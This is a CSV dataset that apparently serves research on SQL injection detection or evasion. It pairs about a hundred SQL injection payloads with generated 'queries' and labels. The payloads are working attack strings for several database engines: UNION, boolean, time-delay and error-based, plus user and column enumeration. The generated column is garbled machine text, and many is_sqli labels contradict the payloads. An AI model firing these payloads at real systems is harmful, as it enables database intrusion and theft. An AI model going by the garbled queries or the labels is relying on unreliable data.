original_query,generated_query,validity,is_sqli
"1%""  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""%""  =  ""","SELECT MIN(SQL) FROM SQL_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr. 113 ) AND NOT (SELECT MIN(SQL_inaddr.xr ( 4386 = 4386 AND 113 ) = ""sql injection""",1,1
"1""   )    )    as dshc where 9911  =  9911 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",SELECT MIN(*) FROM SQL_injection WHERE 9911 = 9911 OR 99_users = 1022 = (SELECT SUM(SELECT SUM(*) FROM SQL_injection),1,1
"1'   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   'jylk'  =  'jylk",SELECT MIN(sql injection) FROM SQL_Injection WHERE NOT chr = 'dbms_pipe.receive_message',1,0
"1"" and   (  1668  =  8054  )  *8054",SELECT MIN(1668 = 8054 ) FROM SQL injection,1,1
1 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  -- xwoo,SELECT MIN(SQL) FROM SQL - XwooM_Procedures AS :___sustained_from FROM SQL,1,0
hi' or 1  =  1 --,SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,0
"-1687   )    )    as lnva where 8396  =  8396 union all select 8396,8396#","SELECT 8396 = 8396,8396# FROM SQL injection",1,1
ORDER BY 14#,"SELECT * FROM query: SELECT query: SELECT FROM 14# AS # FROM SQL_injector WHERE NOT SQL_inject = ""valid""",1,0
1'   )    )    and 4242  =  5831 and    (    (   'xflh' like 'xflh,SELECT MIN(sql) FROM SQL injection detection,1,0
select sleep  (  5  )   and    (    (     (  '%'  =  ',"SELECT * FROM query: SELECT * FROM query: SELECT query: 'yes', query: 'yes', query: 'yes', query: 'yes', query: 'yes', query: 'yes', query: 'yes', query: 'yes', query: 'yes', query: 'yes', query: 'yes', query: 'yes', query: 'yes', query: 'yes'",1,0
"1""  )   as jiyl where 4893  =  4893 union all select null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL_Injection,1,0
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i",SELECT MIN(SELECT) FROM SQL_inject_address WHERE NOT SELECT FROM SQL_inject_name AND NOT i'= 'evade',0,0
"-8588' union all select 2135,2135--","SELECT MIN(2135,2135--) FROM SQL injection AS t1 JOIN Query: -8588' union = ""SQL""",0,1
union all select @@version--,SELECT MIN(sql injection) FROM SQL Query: union All select @@version--,1,1
-1386'  )   or   (  7880  =  5362  )  *5362 and   (  'vsyu' like 'vsyu,SELECT MIN(sql injection) FROM SQL_injection,1,0
"  (  select   (  case when   (  4232  =  4232  )   then   (  select benchmark  (  5000000,md5  (  0x6b637544   )    )     )   else 4232*  (  select 4232 from mysql.db  )   end   )    )   ",SELECT MIN(sql injection) FROM SQL_Injection,1,0
"1%""   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",SELECT * FROM SQL_injection WHERE NOT rdb$types = 'evade',1,0
" select * from users where id  =  1 or \<$ union select 1,@@VERSION -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR $ union select 1,@@VERSION -- 1",1,1
"SELECT column1, column2 FROM table1, table2 WHERE column2='value';",SELECT MIN(value) FROM table2 WHERE NOT column2 = 'SQ',1,0
"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",SELECT MIN(sql injection) FROM SQL_Injection,1,0
1 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,"SELECT MIN(sql injection) FROM SQL_inaddr.get_host_address WHERE NOT chr = 4386 AND 4386 = ""utl_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr (113 ) ||chr ( 4386 = 4386",0,1
"1' and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'fjfo'  =  'fjfo",SELECT MIN(sql) FROM SQL injection = 'evade SQL injection',1,0
-3497' order by 1#,SELECT MIN(1#) FROM SQL injection,1,1
"or SLEEP(5)=""",SELECT MIN(sql) FROM SQL injection,1,0
"1'||  (  select 'oyyu' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",SELECT MIN(sql injection) FROM SQL_Injection,1,0
1 where 6036  =  6036 and 7533  =  7533--,SELECT * FROM query: 1 WHERE 6036 = 6036 = 6036 AND 7533 = 7533-- if NOT query_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine = 'valid',1,1
"1 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  # bzoq",SELECT MIN(*) FROM SQL injection,1,0
"1'  )   as vmmk where 5757  =  5757 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",SELECT MIN(*) FROM SQL injection,1,0
-9562' or 8571  =  8571--,SELECT MIN(sql injection) FROM SQL SELECT -9562' OR 8571 = 8571 - SELECT MIN(sql injection) FROM SQL,1,1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--","SELECT MIN(3000000,MD5(1)) FROM SQL injection AS t1 JOIN 'evade SQL injection'",0,1
"1'||  (  select 'ypil' from dual where 4568  =  4568 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   ||'",SELECT MIN(*) FROM SQL_Injection WHERE 4568 = 4568 OR 4568 = 4568 OR 7552 = (SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(short) FROM SQL) AS :___ FROM SQL_Injection),1,1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--","SELECT * FROM SQL AS t1 JOIN query: ""+if(benchmark(3000000,MD5(1))"" FROM query: ""+if(benchmark(3000000,MD5(1))"" AND NOT SQL_injection = ""valid""",0,1
" select * from users where id  =  1 or "",?"" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE NOT id = 1 OR ORDER BY 1 = 1,1,1
"1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507",SELECT MIN(*) FROM SQL injection,1,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'nmat' like 'nmat","SELECT * FROM SQL_injection WHERE NOT domain.domain.columns = ""t1, domain.columns"" AND NOT domain.tables = ""t3 and 'nmat'",0,0
""" waitfor delay '0:0:20' --","SELECT * FROM query: ""waitfor delay '0:0:20' AND NOT SQL_inject = ""valid""",1,0
""" and 0=benchmark(3000000,MD5(1))%20/*",SELECT * FROM query: 0 = query: 0 = query: 0,1,0
or pg_sleep  (  __TIME__  )  --,SELECT * FROM query: or __TIME__ ),1,0
1'  )   as fxid where 5926  =  5926,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM fxid WHERE NOT 5926 = 5926,1,0
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*","SELECT (SELECT NULL, NULL) FROM query WHERE NOT SQL_inject = ""valid"" ORDER BY NULL",1,0
1'   )    )     )   union all select null--,SELECT DISTINCT null-- FROM SQL injection,1,1
"1  )   as cnpv where 4902  =  4902 and elt  (  1210  =  1210,sleep  (  5   )    )   --","SELECT NOT (SELECT SUM(CNSPv) FROM query: 1 ) AS cnpv WHERE 4902 = 4902 AND NOT elt ( 1210 = 1210,sleep ( 5 )",1,1
select   (  case when   (  8113  =  8981  )   then 8113 else 1/  (  select 0  )   end  )  --,SELECT MIN(SELECT 0 FROM SQL_Injection),1,0
"1'  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'pbqg'  =  'pbqg",SELECT MIN(sql) FROM SQL injection,1,0
"1'   )    )    as qwdh where 7581  =  7581 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",SELECT MIN(sql) FROM SQL_injection WHERE 7581 = 7581 OR COURSE = 7581 OR COURSE = 117 OR COURSE = 109 ORDER BY COURSE,1,1
select   (  case when   (  7169  =  7785  )   then 1 else 7169*  (  select 7169 from master..sysdatabases  )   end  )  --,SELECT * FROM SQL_injection WHERE NOT SELECT MIN(SQL) FROM SQL_Injection),1,0
"-1238'  )   as lxur where 7075  =  7075 union all select 7075,7075,7075,7075,7075,7075,7075,7075,7075,7075#","SELECT MIN(sql injection) FROM SQL_Injection WHERE 7075 = 7075 = 7075 AND union = 7075,7075,7075,7075,7075,7075,7075,7075## as lxur injection detection'",1,1
  )   or pg_sleep  (  __TIME__  )  --,"SELECT * FROM SQL_sleep WHERE NOT __TIME__ = ""valid""",1,0
"1 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ","SELECT MIN(selection) FROM SQL injection, SELECT 0x71706a71, floor (run (selection) FROM SQL - SELECT 0x7171706a71, floor (selection) FROM SQL - SELECT 0x7171706a71, 0x71706a71, 0x71706a71, 0x71706a71, 0x71706a71, 0x7171706a71, 0x7171706a71,'sq injection') GROUP BY 0",1,1
"1'||  (  select 'nzjz' where 3539  =  3539 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",SELECT MIN(sql injection) FROM SQL_injection WHERE 3539 = 3539 AND 8148 = like (SELECT MIN(sql injection) FROM SQL),1,1
"1'   )    )    as babx where 2494  =  2494 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",SELECT MIN(*) FROM SQL_injection WHERE 2494 = 2494 OR 1022 = (SELECT MIN(*) FROM SQL_injection),1,1
" select * from users where id  =  1 or 1#""  (   union select 1,version  (    )   -- 1",SELECT * FROM * FROM users WHERE NOT id = 1 OR 1# = 1 ORDER BY version ( ) -- 1,1,1
"-7559"" or 8792  =  6905--",SELECT MIN(sql injection) FROM SQL_injection,1,0
-7775 or 8571  =  8571--,SELECT * FROM query: -7775 or 8571 = 8571-- FROM query: -7775 or 8571 = 8571--,1,1
"1""  )   where 9770  =  9770 union all select null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,1
1' where 6406  =  6406,SELECT MIN(6406 = 6406) FROM SQL injection,1,0
"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'thce'  =  'thce",SELECT MIN(sql injection) FROM SQL_injection,1,0
select sleep  (  5  )   and    (    (   'ilcv'  =  'ilcv,"SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT SUM((SELECT SUM((SELECT * FROM SELECT SUM((SELECT * FROM SELECT SUM((SELECT * FROM SQL_searcher: query: query: query: 'ilcv', 'ilcv' FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT *",1,0
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*","SELECT MIN(3000000,MD5(1)) FROM SQL injection AS t1 JOIN Query: '+if(benchmark(3000000,MD5(1)'",0,1
"1"" where 7005  =  7005",SELECT MIN(7005 = 7005) FROM SQL injection,1,1
"1'||  (  select 'tdcr' where 6792  =  6792 union all select null,null,null,null,null#",SELECT tdcr FROM SQL JOIN detection of evade SQL injection detection,0,0
"1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  -- xlfz","SELECT * FROM sysibm.systables as t2,sysibm.systables as t3 JOIN SQL injection detection'",1,1
"1'||  (  select 'jscc' from dual where 3266  =  3266 and elt  (  4249  =  4249,7259   )    )   ||'","SELECT 'evade SQL injection detection' FROM SQL JOIN 1'|| WHERE 3266 = 3266 AND NOT jscc = ""elt ( 4249 = 4249 = 7259 )||""",0,1
"1'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'lfhx'  =  'lfhx","SELECT * FROM SQL_injection, COUNT(*) FROM sysibm.systables as t1,sysibm.systables as t3 INTERSECT SELECT * FROM SQL_INSERT SELECT * FROM sysibm.systables as t3 ORDER BY lfhx",0,1
"1""  )   as xylo where 2112  =  2112 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",SELECT DISTINCT t1.case FROM SQL_injection AS t1 JOIN 2112 = 2112 AND t1. +char ( 113 ) +char ( 113 ) +char ( 113 ) AND NOT t1.sql injection = 'evade_susc injection',0,1
waitfor delay '0:0:20' --,SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,0
" select * from users where id  =  '1' union select +\#,@@VERSION -- 1'","SELECT MIN(sql injection) FROM SQL_inject * FROM users WHERE id = '1' union select +#,@@VERSION -- 1'",1,1
"1""  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""gvlc"" like ""gvlc","SELECT MIN(sql injection) FROM SQL - SELECT gvlc FROM ""evade""",1,0
SELECT * FROM Users;,SELECT * FROM Users;SELECT SQL FROM SQL SELECT * FROM Users,1,0
-2951 or 4189  =  2291,SELECT * FROM query: -2951 ORDER BY query: -2991 = 2291,1,0
limit,"SELECT * FROM query: limit WHERE NOT SQL_injection = ""valid""",0,0
1  )   as ptxw where 9873  =  9873,SELECT * FROM query: 1 - SELECT * FROM query: 1 - SELECT * FROM query: 1 - ptxw WHERE NOT SQL_inject = 9873,1,1
"1  )   where 8671  =  8671 and make_set  (  4931  =  1642,1642  )  --",SELECT * FROM query: 1 JOIN SQL injection = 8671 WHERE NOT SQL_Injection = 8671 AND make_set = 4931 = 1642 OFFSET 1642,0,0
"1 where 7362  =  7362 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",SELECT MIN(500000000000/2 ) FROM SQL_Injection WHERE 7362 = 7362 AND 148 = like (SELECT MIN(sql injection) FROM SQL),1,1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i",SELECT MIN(SELECT) FROM SYS.ALL_USERS AND NOT SELECT SELECT FROM SQL SELECT SELECT SELECT FROM SELECT SELECT MIN(SQL) FROM SQL,0,1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  ""%""  =  ""","SELECT MIN(5000000,md5 ( 0x4c4d6142 ) FROM benchmark WHERE NOT SQL_inject = ""valid""",1,1
"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",SELECT * FROM SQL_injection WHERE NOT rdb$types = 'evade',1,0
"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",SELECT MIN(sql injection) FROM SQL_injection,1,0
"1%' union all select null,null,null,null,null,null,null,null,null,null#",SELECT MIN(sql) FROM SQL SELECT evade SQL injection detection FROM SQL,1,0
"iif  (  5519  =  4796,1,1/0  )  ","SELECT * FROM query: iif WHERE NOT SQL_injection = ""valid""",1,0
"1   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   8189  =  8189",SELECT MIN(8189 = 8189) FROM SQL AS _valid_sQCH_inject_sq_inject_usual_required_inject_sq_required_inject_sq_required_sq45 ) AND ((8189 = 8189),1,1
"1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ","SELECT MIN(1808 = 1808,concat) FROM SQL_Injection",1,0
"1 where 4331  =  4331 union all select null,null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0
' and 1 in (select var from temp)--,SELECT DISTINCT ecude_sq_injection FROM SQL_injection,1,0
1'||  (  select 'qgnz' where 6446  =  6446,SELECT 'evade sq injection detection' FROM SQL SELECT SELECT 'evade sq injection detection' FROM SQL SELECT SELECT 'qgnz' FROM SQL,1,0
""",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23","SELECT (select%20if(count(*)) FROM query: ""1,(select%20if(count(*)"" FROM SQL query: ""valid SQL injection""",1,1
"1""  )   and 4760  =  2922",SELECT MIN(222 AS _executive_required) FROM SQL_injection,1,0
"'),NULL)%20waifor%20delay%20'0:0:20'%20/*",SELECT MIN(%20waifor%20delay%20'0:0:20'%20/*) FROM SQL injection,1,1
"-6381%"" or 8571  =  8571--",SELECT MIN(sql injection) FROM SQL_injection,1,0
"1 and elt  (  3114  =  3114,sleep  (  5   )    )   #","SELECT * FROM query: 1 AND NOT SQL_inject = ""valid""",1,1
1'  )   where 3893  =  3893,SELECT MIN(3893 = 3893) FROM SQL injection,1,0
"1%"" or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""%""  =  """,SELECT MIN(500000000/2 ) FROM SQL_Injection WHERE NOT SELECT 'evade SQL injection' ORDER BY %,1,0
"-2803""  )   union all select 5337,5337,5337,5337,5337,5337,5337#",SELECT MIN(sql injection) FROM SQL_injection,1,0
"1' and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ","SELECT MIN(*) FROM SQL_Injection WHERE NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7""",1,1
"'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SELECT MIN(%20delay%20'0:20'%20/*) FROM SQL injection,1,1
"1' or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",SELECT MIN(sql) FROM SQL injection,1,0
"1""  )   where 6367  =  6367 union all select null,null,null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL_Injection,1,0
"admin""/*",SELECT MIN(sql injection) FROM SQL Query: admin,1,0
"1'   )    )    as wkys where 2478  =  2478 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",SELECT MIN(6055 ='sq injection') FROM SQL_injection,1,0
"1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#",SELECT MIN(sql) FROM SQL injection WHERE 8538 = 8538,1,1
"1  )   as nkjo where 8462  =  8462 union all select null,null,null,null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL_Injection,1,0
